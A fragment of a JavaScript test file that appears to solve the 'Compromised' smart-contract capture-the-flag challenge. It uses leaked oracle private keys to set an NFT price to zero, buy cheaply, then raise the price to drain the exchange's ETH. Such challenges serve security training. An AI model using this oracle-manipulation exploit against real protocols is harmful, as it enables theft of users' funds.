...
describe('Compromised challenge', function () {
  ...
  it('Execution', async function () {
    ...
    const oracle0 = new ethers.Wallet(keys[0], ethers.provider);
    const oracle1 = new ethers.Wallet(keys[1], ethers.provider);

    await this.oracle.connect(oracle0).postPrice('DVNFT', ethers.utils.parseEther('0'));
    ...
    const tokenId = receipt.events.pop().args['tokenId'];

    this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
    await this.oracle.connect(oracle0).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
